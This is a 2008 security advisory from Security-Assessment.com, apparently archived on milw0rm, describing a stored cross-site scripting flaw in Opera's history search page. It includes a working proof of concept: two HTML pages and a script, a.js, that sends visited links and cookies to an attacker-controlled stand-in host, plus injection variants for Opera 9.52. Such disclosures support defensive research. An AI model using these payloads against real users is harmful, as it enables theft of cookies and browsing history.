@@ -1,0 +1,158 @@
+=======================================================================
+= Opera Stored Cross Site Scripting Vulnerability
+=
+= Vendor Website:
+= http://www.opera.com
+=
+= Affected Version:
+=   -- All desktop versions
+=
+= Public disclosure on 22nd October 2008
+=
+========================================================================
+Available online at:
+http://www.security-assessment.com/files/advisories/2008-10-22_Opera_Stored_Cross_Site_Scripting.pdf
+
+== Issue Details ==
+
+Opera browser is vulnerable to stored Cross Site Scripting.  A malicious attacker is able to inject arbitrary browser content through the
+websites visited with the Opera browser. The code injection is rendered into the Opera History Search page which displays URL and a short
+description of the visited pages.
+
+== Bug Analysis ==
+
+Opera.exe imports Opera.dll which handles most of the browser functionality.
+Whenever a user visits a page, the URL, and a part of the content of the visited page is saved and compressed in a file named md.dat . The
+
+file md.dat can be found at the following path in a standard Windows Opera installation:
+
+c:\Documents and Settings\user\Local Settings\Application Data\Opera\Opera\profile\vps\0000\md.dat
+
+The vulnerability exists in the way the URL and the content of visited page is stored and rendered from the md.dat file.
+
+== Opera History Search Page Generation ==
+
+User visits a new site. When the user closes the Opera browser, the file md.dat is updated. The Opera browser appends a block of 2000 bytes for each site visited.
+The site URL and title are extracted and put in clear text at begin of the 2000 bytes block.
+The preview content which appears on opera:historysearch page for the site is compressed into the file md.dat. However, the HTML encoding 
+is not consistent across the URL scheme of the site and the injection is possible in the optional fragment of the URL (after the # character).
+
+The following sequence summarises an attack scenario:
+
+1.User visits http://aaa.com/index.htm#<script src=http://badsite/bad.js></script>
+2.URL and preview content is stored in the history search page. However, the optional fragment after the character # is not encoded properly.
+3.If the user visits the history search page, the cross site scripting is rendered in the user browser context.
+
+== Opera History Search Page Rendering ==
+
+When accessing the History Search page, Opera reads the file md.dat again. The content from md.dat is decompressed and 
+saved into a buffer. The buffer is then used to generate a cache file that contains the HTML code of the history search page.
+The cache file can be found such as:
+
+c:\Documents and Settings\user\Local Settings\Application Data\Opera\Opera\profile\cache4\opr000EA
+
+Then Opera reads the content from the cache file to display the history search page. The HTML code is not escaped for the optional 
+fragment on the URL of the visited pages.
+
+== Opera History/Cookie Exposed - Exploit Description ==
+
+Victim visits site xxx/1.html and clicks on the link. The 1.html source code:
+
+1.HTML
+
+<html>
+<a href='http://xxx/2.html#<script src=http://xxx/a.js></script>'>a</a>
+</html>
+
+The link includes the cross site scripting injection and brings the victim to page 2.html. The web server returns 200 OK. The 2.html source code:
+
+2.HTML
+
+<html>
+This is a proof of concept.
+
+<script>
+setTimeout("document.location='opera:historysearch?q=*'",5000);
+</script>
+</html>
+
+The user is then redirected to the opera:historysearch page where the injection has been stored in the history after the user followed the
+link from 1.html. The injection inserted a malicious JavaScript a.js which is executed when the user reaches the opera history search page.
+
+a.js
+
+
+var x;
+for (x in document.links)
+{
+document.write("<img src=http://yyy/xxx.asp?query="+document.links[x].href+">");
+}
+document.write("<img src=http://yyy/xxx.asp?keyword="+document.cookie+">");
+setTimeout("document.location='http://xxx/3.html'",5000);
+
+The malicious JavaScript includes a cross site forged request that dumps the URL of the visited pages to a third site yyy controlled by the attacker. 
+Then the content of the cookie is also dumped and finally the user is redirected to another page 3.html.
+
+== Opera History Cross Site Scripting and Cross Site Request Forgery ==
+
+This is the HTML source code of the opera:historysearch?q=* page following the injection (highlighted in bold):
+
+<li value="3">
+<h2><a href="http://xxx/2.html#<script src=http://xxx/a.js></script>">(null)</a></h2>
+<p>This is a proof of concept. </p>
+<cite><ins>10/9/2008 12:39:16 AM</ins> - http://xxx/2.html#<script src=http://xxx/a.js></script></cite>
+
+Note that in Opera 9.52, the injection is possible in other locations:
+
+URL: http://xxx/2.html?a="><script src=http://xxx/a.js</script>
+
+Injection:
+
+<li value="3">
+<h2><a href=http://xxx/2.html?a="><script src=http://xxx/a.js></script>">...
+
+
+URL: http://xxx/2.html?a=<script src=http://xxx/a.js</script>
+
+Injection:
+
+<li value="3">
+<h2><a href="http://xxx/2.html?a=<script src=http://xxx/a.js></script>">(null)</a></h2>
+<p>This is a proof of concept. </p>
+<cite><ins>10/9/2008 12:39:16 AM</ins> - http://xxx/2.html?a=<script src=http://xxx/a.js></script></cite>
+
+Opera 9.60 has partially fixed the issues above but the HTML encoding is still not consistent.
+
+== Credit ==
+
+Discovered and advised to Opera
+October 2008 by Roberto Suggi Liverani of Security-Assessment.com
+Personal Page: http://malerisch.net
+
+== Greetings ==
+
+To all my SA colleagues - you guys rock!  ;-) 
+
+
+== About Security-Assessment.com ==
+
+Security-Assessment.com is Australasia's leading team of Information
+Security consultants specialising in providing high quality Information
+Security services to clients throughout the Asia Pacific region. Our
+clients include some of the largest globally recognised companies in
+areas such as finance, telecommunications, broadcasting, legal and
+government. Our aim is to provide the very best independent advice and
+a high level of technical expertise while creating long and lasting
+professional relationships with our clients.
+
+Security-Assessment.com is committed to security research and
+development, and its team continues to identify and responsibly publish
+vulnerabilities in public and private software vendor's products.
+Members of the Security-Assessment.com R&D team are globally recognised
+through their release of whitepapers and presentations related to new
+security research.
+
+Roberto Suggi Liverani
+Security-Assessment.com
+
+# milw0rm.com [2008-10-22]
